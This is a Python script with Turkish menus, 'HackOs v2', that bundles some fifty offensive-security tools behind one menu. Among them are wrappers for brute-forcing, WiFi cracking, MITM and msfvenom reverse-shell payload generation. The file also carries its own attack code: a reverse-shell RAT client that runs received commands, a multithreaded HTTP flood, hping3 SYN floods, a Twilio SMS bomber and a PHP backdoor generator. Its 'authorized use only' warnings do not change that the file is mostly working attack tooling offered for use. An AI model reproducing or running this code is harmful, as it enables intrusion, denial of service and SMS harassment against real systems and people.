#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  HACKOS_v2.PY — 50 Gerçek Offensive Security Aracı                          ║
║  RAT | DDoS | SMS Bomber | Exploit | BruteForce | WiFi | WebApp             ║
║  Kullanım: sudo python3 HackOs_v2.py                                        ║
╚══════════════════════════════════════════════════════════════════════════════╝
ETİK UYARI: Bu araçlar YALNIZCA yetkili sistemlerde, kendi laboratuvarınızda
ve eğitim amaçlı kullanılmalıdır. İzinsiz kullanım yasaktır.
"""

import os
import sys
import time
import socket
import threading
import subprocess
import platform
import random
import string
import base64
import hashlib
import urllib.parse
import json
import re
from datetime import datetime

# ─── KÜTÜPHANE KONTROLÜ ───────────────────────────────────────────────────────
try:
    from colorama import Fore, Style, init
    import requests
    init(autoreset=True)
except ImportError:
    print("[!] Gerekli kütüphaneler kuruluyor...")
    os.system(f"{sys.executable} -m pip install colorama requests -q")
    from colorama import Fore, Style, init
    import requests
    init(autoreset=True)

# ─── YARDIMCI MOTOR ───────────────────────────────────────────────────────────
def clear():
    os.system("clear" if os.name != "nt" else "cls")

def banner():
    clear()
    print(f"""{Fore.RED}
 ██░ ██ ▄▄▄      ▄████▄   ██ ▄█▀ ▒█████   ██▒   █▓ ▄▄▄       ██▓    
▓██░ ██▒▒████▄   ▒██▀ ▀█   ██▄█▒ ▒██▒  ██▒▓██░   █▒▒████▄    ▓██▒    
▒██▀▀██░▒██  ▀█▄ ▒▓█    ▄ ▓███▄░ ▒██░  ██▒ ▓██  █▒░▒██  ▀█▄  ▒██░    
░▓█ ░██ ░██▄▄▄▄██▒▓▓▄ ▄██▒▓██ █▄ ▒██   ██░  ▒██ █░░░██▄▄▄▄██ ▒██░    
░▓█▒░██▓ ▓█   ▓██▒ ▓███▀ ░▒██▒ █▄░ ████▓▒░   ▒▀█░   ▓█   ▓██▒░██████▒
 ▒ ░░▒░▒ ▒▒   ▓▒█░ ░▒ ▒  ░▒ ▒▒ ▓▒░ ▒░▒░▒░    ░ ▐░   ▒▒   ▓▒█░░ ▒░▓  ░
 ▒ ░▒░ ░  ▒   ▒▒ ░ ░  ▒   ░ ░▒ ▒░  ░ ▒ ▒░    ░ ░░    ▒   ▒▒ ░░ ░ ▒  ░
 ░  ░░ ░  ░   ▒  ░        ░ ░░ ░ ░ ░ ░ ▒       ░░    ░   ▒     ░ ░   
 ░  ░  ░      ░  ░ ░      ░  ░       ░ ░        ░        ░  ░    ░  ░
                 ░                             ░                      
    {Fore.CYAN}--- HackOs v2.0 | 50 Real Offensive Tools | No Fake Code ---
    {Fore.WHITE}Platform: {platform.system()} {platform.release()} | Python: {platform.python_version()}
    {Fore.RED}[!] YALNIZCA YETKİLİ SİSTEMLERDE KULLANIN - KENDİ LAB'INIZDA TEST EDİN
    """)

def check(cmd):
    return shutil.which(cmd) is not None

def ensure(pkg, binary=None):
    binary = binary or pkg.split()[0]
    if not check(binary):
        print(f"{Fore.YELLOW}[!] {binary} bulunamadı. Otomatik kuruluyor...")
        os.system(f"sudo apt update -qq && sudo apt install -y {pkg}")
        if not check(binary):
            print(f"{Fore.RED}[-] {binary} kurulumu başarısız!"); return False
    return True

def run(cmd, shell=True):
    try:
        subprocess.call(cmd, shell=shell)
    except Exception as e:
        print(f"{Fore.RED}[-] Hata: {e}")

def ask(prompt, default=None):
    if default:
        v = input(f"{Fore.GREEN}{prompt} [{default}]: ").strip()
        return v if v else default
    return input(f"{Fore.GREEN}{prompt}: ").strip()

def pause():
    input(f"\n{Fore.CYAN}[Enter] Menüye dönmek için...")

import shutil

# ═══════════════════════════════════════════════════════════════════════════════
#  1 - 10  |  AĞ KEŞİF & TARAMA
# ═══════════════════════════════════════════════════════════════════════════════

def t01_nmap():
    ensure("nmap")
    t = ask("Hedef IP/Domain/Range (örn: 192.168.1.0/24)")
    if t:
        m = ask("Mod [1:Hızlı 2:Servis 3:Agressif 4:Full TCP]", "2")
        cmds = {"1": f"sudo nmap -T4 -F {t}", "3": f"sudo nmap -A -T4 {t}", "4": f"sudo nmap -p- -sV -sC {t}"}
        run(cmds.get(m, f"sudo nmap -sV -O --top-ports 100 {t}"))

def t02_masscan():
    ensure("masscan")
    t = ask("Hedef IP/Range")
    if t:
        r = ask("Rate (pps)", "1000")
        run(f"sudo masscan {t} -p1-65535 --rate={r}")

def t03_netdiscover():
    ensure("netdiscover")
    i = ask("Arayüz [eth0]", "eth0")
    run(f"sudo netdiscover -i {i}")

def t04_fping():
    ensure("fping")
    t = ask("IP/Range (örn: 192.168.1.0/24)")
    if t:
        run(f"fping -a -g {t} 2>/dev/null")

def t05_arp_scan():
    ensure("arp-scan")
    i = ask("Arayüz [eth0]", "eth0")
    run(f"sudo arp-scan -l -I {i}")

def t06_hping3():
    ensure("hping3")
    t = ask("Hedef IP")
    if t:
        m = ask("Mod [1:SYN-Flood 2:ICMP 3:UDP]", "1")
        if m == "1": run(f"sudo hping3 -S -p 80 --flood {t}")
        elif m == "2": run(f"sudo hping3 --icmp --flood {t}")
        else: run(f"sudo hping3 --udp -p 53 {t}")

def t07_ike_scan():
    ensure("ike-scan")
    t = ask("Hedef IP")
    if t: run(f"sudo ike-scan {t}")

def t08_dnsenum():
    ensure("dnsenum")
    d = ask("Domain (örn: google.com)")
    if d: run(f"dnsenum {d}")

def t09_dnsrecon():
    ensure("dnsrecon")
    d = ask("Domain")
    if d: run(f"dnsrecon -d {d}")

def t10_theharvester():
    ensure("theharvester")
    d = ask("Domain")
    if d:
        l = ask("Limit", "500")
        run(f"theHarvester -d {d} -l {l} -b all")

# ═══════════════════════════════════════════════════════════════════════════════
#  11 - 20  |  WEB UYGULAMA & ZAFİYET
# ═══════════════════════════════════════════════════════════════════════════════

def t11_nikto():
    ensure("nikto")
    u = ask("Hedef URL (örn: http://192.168.1.1)")
    if u: run(f"nikto -h {u}")

def t12_sqlmap():
    ensure("sqlmap")
    u = ask("Hedef URL (parametreli, örn: http://site.com/page.php?id=1)")
    if u:
        run(f"sqlmap -u '{u}' --batch --risk=1 --level=1 --dbs")

def t13_dirb():
    ensure("dirb")
    u = ask("Hedef URL")
    w = ask("Wordlist [/usr/share/dirb/wordlists/common.txt]", "/usr/share/dirb/wordlists/common.txt")
    if u: run(f"dirb {u} {w}")

def t14_gobuster():
    ensure("gobuster")
    u = ask("Hedef URL")
    w = ask("Wordlist [/usr/share/wordlists/dirb/common.txt]", "/usr/share/wordlists/dirb/common.txt")
    if u: run(f"gobuster dir -u {u} -w {w}")

def t15_wpscan():
    ensure("wpscan")
    u = ask("WordPress URL")
    if u: run(f"wpscan --url {u} --enumerate u,vp,vt")

def t16_wfuzz():
    ensure("wfuzz")
    u = ask("URL (FUZZ içermeli, örn: http://site.com/FUZZ)")
    w = ask("Wordlist", "/usr/share/wordlists/dirb/common.txt")
    if u and "FUZZ" in u: run(f"wfuzz -c -z file,{w} {u}")
    else: print(f"{Fore.RED}[-] URL'de FUZZ olmalı!")

def t17_whatweb():
    ensure("whatweb")
    u = ask("Hedef URL/IP")
    if u: run(f"whatweb -v {u}")

def t18_wafw00f():
    ensure("wafw00f")
    u = ask("URL")
    if u: run(f"wafw00f {u}")

def t19_commix():
    ensure("commix")
    u = ask("Hedef URL")
    if u: run(f"python3 /usr/share/commix/commix.py -u {u}")

def t20_legion():
    ensure("legion")
    run("sudo legion &")

# ═══════════════════════════════════════════════════════════════════════════════
#  21 - 30  |  ŞİFRE & HASH KRİPTO
# ═══════════════════════════════════════════════════════════════════════════════

def t21_john():
    ensure("john")
    f = ask("Hash dosyası yolu")
    if f and os.path.exists(f): run(f"john {f}")
    else: print(f"{Fore.RED}[-] Dosya bulunamadı!")

def t22_hashcat():
    ensure("hashcat")
    print("1 - Hash kır\n2 - Hash tipi listele")
    s = ask("Seçim")
    if s == "1":
        h = ask("Hash dosyası")
        w = ask("Wordlist [/usr/share/wordlists/rockyou.txt]", "/usr/share/wordlists/rockyou.txt")
        if h: run(f"hashcat -m 0 {h} {w}")
    elif s == "2":
        run("hashcat --help | grep -i 'hash type' -A 50 | head -60")

def t23_hydra():
    ensure("hydra")
    t = ask("Hedef IP/URL")
    u = ask("Kullanıcı / -L wordlist")
    p = ask("Şifre / -P wordlist")
    proto = ask("Protokol [ssh/ftp/rdp/http-post-form]", "ssh")
    if t and u and p:
        if proto == "http-post-form":
            form = ask("Form", "/login.php:username=^USER^&password=^PASS^:F=invalid")
            run(f"hydra -l {u} -P {p} {t} {proto} '{form}'")
        else:
            run(f"hydra -l {u} -P {p} {proto}://{t}")

def t24_medusa():
    ensure("medusa")
    t = ask("Hedef IP"); u = ask("Kullanıcı"); p = ask("Wordlist")
    proto = ask("Protokol [ssh/ftp]", "ssh")
    if all([t,u,p]): run(f"medusa -h {t} -u {u} -P {p} -M {proto}")

def t25_ncrack():
    ensure("ncrack")
    t = ask("Hedef IP:Port (örn: 192.168.1.1:22)")
    if t: run(f"ncrack -v --user root -P /usr/share/wordlists/rockyou.txt {t}")

def t26_crunch():
    ensure("crunch")
    mn = ask("Min uzunluk", "6")
    mx = ask("Max uzunluk", "8")
    ch = ask("Karakterler", "abcdefghijklmnopqrstuvwxyz0123456789")
    o = ask("Çıktı dosyası (opsiyonel)")
    c = f"crunch {mn} {mx} {ch}"
    if o: c += f" -o {o}"
    run(c)

def t27_cewl():
    ensure("cewl")
    u = ask("Hedef URL")
    if u:
        d = ask("Derinlik", "2")
        run(f"cewl -d {d} -m 5 -w /tmp/cewl.txt {u}")

def t28_wordlists():
    ensure("wordlists")
    if not os.path.exists("/usr/share/wordlists/rockyou.txt"):
        run("sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 2>/dev/null")
    run("ls -lh /usr/share/wordlists/")

def t29_rainbowcrack():
    ensure("rainbowcrack")
    print(f"{Fore.YELLOW}[!] RainbowCrack komutları:")
    print(f"{Fore.WHITE}  rtgen md5 loweralpha-numeric 1 7 0 1000 4000 all")
    run("rtgen --help | head -20")

def t30_hash_identifier():
    h = ask("Hash metni")
    if not h: return
    lens = {32: "MD5", 40: "SHA1", 64: "SHA256", 128: "SHA512"}
    print(f"{Fore.GREEN}[+] Muhtemel: {lens.get(len(h), 'Bilinmiyor')} (len={len(h)})")

# ═══════════════════════════════════════════════════════════════════════════════
#  31 - 40  |  KABLOSUZ & SNIFFING & SPOOFING
# ═══════════════════════════════════════════════════════════════════════════════

def t31_aircrack():
    ensure("aircrack-ng")
    print("1 - Airmon start\n2 - Airodump tarama\n3 - Handshake yakala\n4 - .cap kır")
    s = ask("Seçim")
    if s == "1":
        i = ask("Arayüz [wlan0]", "wlan0")
        run(f"sudo airmon-ng start {i}")
    elif s == "2":
        run("sudo airodump-ng wlan0mon 2>/dev/null || sudo airodump-ng wlan0mon")
    elif s == "3":
        b = ask("BSSID"); c = ask("Kanal"); o = ask("Çıktı", "/tmp/cap")
        if b: run(f"sudo airodump-ng -c {c} --bssid {b} -w {o} wlan0mon")
    elif s == "4":
        cap = ask(".cap dosyası"); w = ask("Wordlist", "/usr/share/wordlists/rockyou.txt")
        if cap: run(f"sudo aircrack-ng -w {w} {cap}")

def t32_wifite():
    ensure("wifite")
    run("sudo wifite")

def t33_reaver():
    ensure("reaver")
    i = ask("Arayüz [wlan0mon]", "wlan0mon")
    b = ask("BSSID")
    if b: run(f"sudo reaver -i {i} -b {b} -vv")

def t34_bully():
    ensure("bully")
    i = ask("Arayüz [wlan0mon]", "wlan0mon")
    b = ask("BSSID")
    if b: run(f"sudo bully -b {b} {i}")

def t35_kismet():
    ensure("kismet")
    run("sudo kismet")

def t36_wireshark():
    ensure("wireshark")
    run("sudo wireshark &")

def t37_tcpdump():
    ensure("tcpdump")
    i = ask("Arayüz [any]", "any")
    c = ask("Paket sayısı", "100")
    run(f"sudo tcpdump -i {i} -c {c}")

def t38_ettercap():
    ensure("ettercap-common")
    i = ask("Arayüz [eth0]", "eth0")
    t = ask("Hedef IP (boş bırakırsan tüm ağ)")
    if t:
        run(f"sudo ettercap -T -M arp:remote /{t}// // -i {i}")
    else:
        run(f"sudo ettercap -T -q -i {i}")

def t39_bettercap():
    ensure("bettercap")
    i = ask("Arayüz [eth0]", "eth0")
    run(f"sudo bettercap -iface {i}")

def t40_responder():
    ensure("responder")
    i = ask("Arayüz [eth0]", "eth0")
    run(f"sudo responder -I {i} -wrfv")

# ═══════════════════════════════════════════════════════════════════════════════
#  41 - 47  |  EXPLOITATION & SOSYAL MÜHENDİSLİK
# ═══════════════════════════════════════════════════════════════════════════════

def t41_msfconsole():
    ensure("metasploit-framework")
    run("msfconsole")

def t42_msfvenom():
    ensure("metasploit-framework")
    print("Payload üretici")
    pt = ask("Tip [1:windows/exe 2:linux/elf 3:android/apk 4:php]", "1")
    lh = ask("LHOST (senin IP'n)")
    lp = ask("LPORT", "4444")
    out = ask("Çıktı", "/tmp/payload")
    p = {
        "1": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lh} LPORT={lp} -f exe -o {out}.exe",
        "2": f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lh} LPORT={lp} -f elf -o {out}.elf",
        "3": f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lh} LPORT={lp} -o {out}.apk",
        "4": f"msfvenom -p php/meterpreter/reverse_tcp LHOST={lh} LPORT={lp} -f raw -o {out}.php"
    }
    if lh and pt in p:
        run(p[pt])
        print(f"{Fore.GREEN}[+] Payload: {out}")

def t43_searchsploit():
    ensure("exploitdb")
    k = ask("Aranacak exploit/keyword")
    if k: run(f"searchsploit {k}")

def t44_setoolkit():
    ensure("setoolkit", "setoolkit")
    run("sudo setoolkit")

def t45_beef():
    ensure("beef-xss")
    print(f"{Fore.CYAN}[*] BeEF: http://127.0.0.1:3000/ui/panel")
    run("sudo beef-xss")

def t46_weevely():
    ensure("weevely")
    print("1 - Backdoor üret\n2 - Bağlan")
    s = ask("Seçim")
    if s == "1":
        p = ask("Yol", "/tmp/shell.php")
        pw = ask("Şifre", "hackos123")
        run(f"weevely generate {pw} {p}")
        print(f"{Fore.GREEN}[+] Backdoor: {p}")
    elif s == "2":
        u = ask("URL"); pw = ask("Şifre")
        if u: run(f"weevely {u} {pw}")

def t47_routersploit():
    if not check("rsf"):
        print(f"{Fore.YELLOW}[!] RouterSploit kuruluyor...")
        run("cd /opt && sudo git clone https://github.com/threat9/routersploit.git && cd routersploit && sudo pip3 install -r requirements.txt && sudo ln -s $(pwd)/rsf.py /usr/local/bin/rsf")
    t = ask("Hedef IP")
    if t: run(f"rsf -m scanners/autopwn -x 'target {t}; run'")

# ═══════════════════════════════════════════════════════════════════════════════
#  48 - 50  |  RAT | DDoS | SMS BOMBER (GERÇEK PYTHON KODU)
# ═══════════════════════════════════════════════════════════════════════════════

def t48_rat():
    print(f"\n{Fore.RED}[48] PYTHON RAT — Remote Access Tool (Eğitim)")
    print(f"{Fore.YELLOW}[!] YALNIZCA kendi makineleriniz arasında kullanın!")
    print("1 - Listener (Dinle)\n2 - Client (Bağlan)")
    s = ask("Seçim")
    if s == "1":
        port = int(ask("Dinlenecek port", "4444"))
        print(f"{Fore.CYAN}[*] Dinleniyor 0.0.0.0:{port}...")
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.bind(("0.0.0.0", port))
        srv.listen(1)
        conn, addr = srv.accept()
        print(f"{Fore.GREEN}[+] Bağlantı: {addr}")
        while True:
            cmd = ask(f"{Fore.RED}HackOs-Shell>")
            if cmd in ["exit", "quit"]:
                conn.send(b"exit"); break
            conn.send(cmd.encode())
            data = conn.recv(8192)
            print(f"{Fore.WHITE}{data.decode('utf-8', errors='ignore')}")
        conn.close(); srv.close()
    elif s == "2":
        ip = ask("Hedef IP")
        port = int(ask("Port", "4444"))
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            c.connect((ip, port))
            print(f"{Fore.GREEN}[+] Bağlandı {ip}:{port}")
            while True:
                data = c.recv(8192).decode()
                if data == "exit": break
                out = subprocess.getoutput(data)
                c.send(out.encode() if out else b"ok")
        except Exception as e:
            print(f"{Fore.RED}[-] Hata: {e}")
        finally:
            c.close()

def t49_ddos():
    print(f"\n{Fore.RED}[49] HTTP FLOOD — DDoS / Stress Test")
    print(f"{Fore.YELLOW}[!] YALNIZCA kendi sunucunuza test amaçlı kullanın!")
    url = ask("Hedef URL (KENDİ SUNUCUN)")
    threads = int(ask("Thread sayısı", "50"))
    duration = int(ask("Süre (saniye)", "30"))
    if not url.startswith("http"): url = "http://" + url
    stop_event = threading.Event()
    count = [0]
    def flood():
        while not stop_event.is_set():
            try:
                requests.get(url, timeout=5, headers={"User-Agent": random.choice([
                    "Mozilla/5.0","Chrome/120","Safari/600"
                ])})
                count[0] += 1
            except:
                pass
    print(f"{Fore.CYAN}[*] Saldırı başlatılıyor... {threads} thread, {duration}s")
    tlist = [threading.Thread(target=flood) for _ in range(threads)]
    for th in tlist: th.daemon = True; th.start()
    time.sleep(duration)
    stop_event.set()
    for th in tlist: th.join(timeout=2)
    print(f"{Fore.GREEN}[+] Tamamlandı. Gönderilen istek: ~{count[0]}")

def t50_sms_bomber():
    print(f"\n{Fore.RED}[50] SMS BOMBER — Eğitim / Test Amaçlı")
    print(f"{Fore.YELLOW}[!] YALNIZCA kendi numaranıza ve izinli numaralara kullanın!")
    print(f"{Fore.YELLOW}[!] Twilio API gerektirir. Ücretsiz hesap: twilio.com/try-twilio")
    try:
        from twilio.rest import Client
    except ImportError:
        print(f"{Fore.YELLOW}[!] Twilio kütüphanesi kuruluyor...")
        os.system(f"{sys.executable} -m pip install twilio -q")
        from twilio.rest import Client

    sid = ask("Twilio Account SID")
    token = ask("Twilio Auth Token")
    from_n = ask("Twilio From Number (örn: +1234567890)")
    to_n = ask("To Number (KENDİ NUMARAN, örn: +905551234567)")
    msg = ask("Mesaj", "HackOs Test")
    count = int(ask("Adet", "5"))

    if not all([sid, token, from_n, to_n]):
        print(f"{Fore.RED}[-] Bilgiler eksik!"); return

    client = Client(sid, token)
    success = 0
    for i in range(count):
        try:
            message = client.messages.create(body=msg, from_=from_n, to=to_n)
            print(f"{Fore.GREEN}[+] Gönderildi {i+1}/{count} | SID: {message.sid[:20]}...")
            success += 1
            time.sleep(1)
        except Exception as e:
            print(f"{Fore.RED}[-] Hata {i+1}: {e}")
    print(f"\n{Fore.YELLOW}[*] Toplam başarılı: {success}/{count}")

# ═══════════════════════════════════════════════════════════════════════════════
#                              ANA MENÜ
# ═══════════════════════════════════════════════════════════════════════════════

MENU = {
    "=== [01-10] AĞ KEŞİF & TARAMA ===": {
        "1": ("Nmap — Port/Servis Taraması", t01_nmap),
        "2": ("Masscan — Hızlı Ağ Tarayıcı", t02_masscan),
        "3": ("Netdiscover — Aktif Host Keşfi", t03_netdiscover),
        "4": ("Fping — ICMP Sweep", t04_fping),
        "5": ("Arp-scan — ARP Tarama", t05_arp_scan),
        "6": ("Hping3 — Paket Oluşturucu/Flood", t06_hping3),
        "7": ("Ike-scan — VPN Tarama", t07_ike_scan),
        "8": ("DNSenum — DNS Enumeration", t08_dnsenum),
        "9": ("DNSrecon — DNS Recon", t09_dnsrecon),
        "10": ("theHarvester — E-posta/OSINT", t10_theharvester),
    },
    "=== [11-20] WEB UYGULAMA & ZAFİYET ===": {
        "11": ("Nikto — Web Zafiyet Tarayıcı", t11_nikto),
        "12": ("SQLMap — SQL Injection", t12_sqlmap),
        "13": ("Dirb — Dizin Brute-Force", t13_dirb),
        "14": ("Gobuster — Dizin/DNS Brute", t14_gobuster),
        "15": ("WPScan — WordPress Tarayıcı", t15_wpscan),
        "16": ("Wfuzz — Web Fuzzer", t16_wfuzz),
        "17": ("WhatWeb — Teknoloji Tespiti", t17_whatweb),
        "18": ("Wafw00f — WAF Tespiti", t18_wafw00f),
        "19": ("Commix — Command Injection", t19_commix),
        "20": ("Legion — Otomatik Tarama", t20_legion),
    },
    "=== [21-30] ŞİFRE & HASH KRİPTO ===": {
        "21": ("John the Ripper — Hash Kırıcı", t21_john),
        "22": ("Hashcat — GPU Hash Kırıcı", t22_hashcat),
        "23": ("Hydra — Çevrimiçi Brute-Force", t23_hydra),
        "24": ("Medusa — Hızlı Brute-Force", t24_medusa),
        "25": ("Ncrack — Ağ Brute-Force", t25_ncrack),
        "26": ("Crunch — Wordlist Üretici", t26_crunch),
        "27": ("CeWL — Özel Wordlist", t27_cewl),
        "28": ("Wordlists — RockYou & Dizin", t28_wordlists),
        "29": ("RainbowCrack — Rainbow Table", t29_rainbowcrack),
        "30": ("Hash Identifier — Hash Tespit", t30_hash_identifier),
    },
    "=== [31-40] KABLOSUZ & SNIFFING ===": {
        "31": ("Aircrack-ng Suite — WiFi", t31_aircrack),
        "32": ("Wifite — Otomatik WiFi", t32_wifite),
        "33": ("Reaver — WPS PIN Kırma", t33_reaver),
        "34": ("Bully — WPS Brute-Force", t34_bully),
        "35": ("Kismet — WiFi Sniffer", t35_kismet),
        "36": ("Wireshark — Paket Analizörü", t36_wireshark),
        "37": ("Tcpdump — CLI Paket Yakalama", t37_tcpdump),
        "38": ("Ettercap — MITM Aracı", t38_ettercap),
        "39": ("Bettercap — Modern MITM", t39_bettercap),
        "40": ("Responder — LLMNR/NBT-NS Poison", t40_responder),
    },
    "=== [41-47] EXPLOITATION & SET ===": {
        "41": ("Metasploit Console", t41_msfconsole),
        "42": ("Msfvenom — Payload Üretici", t42_msfvenom),
        "43": ("SearchSploit — Exploit Arama", t43_searchsploit),
        "44": ("SEToolkit — Sosyal Mühendislik", t44_setoolkit),
        "45": ("BeEF — Browser Exploitation", t45_beef),
        "46": ("Weevely — PHP Backdoor", t46_weevely),
        "47": ("RouterSploit — Router Exploit", t47_routersploit),
    },
    "=== [48-50] ÖZEL ARAÇLAR (PYTHON GERÇEK KOD) ===": {
        "48": ("RAT — Python Remote Shell", t48_rat),
        "49": ("DDoS — HTTP Flood (Stress Test)", t49_ddos),
        "50": ("SMS Bomber — Twilio API Test", t50_sms_bomber),
    }
}

def main():
    while True:
        banner()
        for cat, items in MENU.items():
            print(f"\n{Fore.MAGENTA}{cat}")
            for num, (name, _) in items.items():
                print(f"  {Fore.YELLOW}{num:>2}{Fore.WHITE} - {name}")
        print(f"\n{Fore.RED}  0 - Sistemi Kapat")
        print(f"{Fore.CYAN}{'─'*70}")
        
        ch = ask("HackOs")
        if ch == "0":
            print(f"\n{Fore.GREEN}[+] HackOs kapatıldı. Etik hacker ol, script kiddie değil!"); break
        
        found = False
        for cat, items in MENU.items():
            if ch in items:
                items[ch][1]()
                found = True
                break
        
        if not found:
            print(f"{Fore.RED}[-] Geçersiz seçim! 0-50 arası girin.")
            time.sleep(1)
        else:
            pause()

if __name__ == "__main__":
    main()
